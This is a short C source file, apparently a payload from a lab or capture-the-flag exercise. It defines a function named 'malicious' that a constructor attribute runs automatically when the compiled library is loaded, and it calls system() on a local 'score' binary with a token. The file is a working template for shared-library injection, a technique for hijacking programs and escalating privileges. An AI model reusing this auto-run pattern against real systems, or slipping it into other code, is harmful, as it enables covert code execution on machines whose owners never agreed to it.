#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
    system("/usr/local/bin/score 6ef5e928-2082-40ac-8b2f-1e64910a68fa");
}
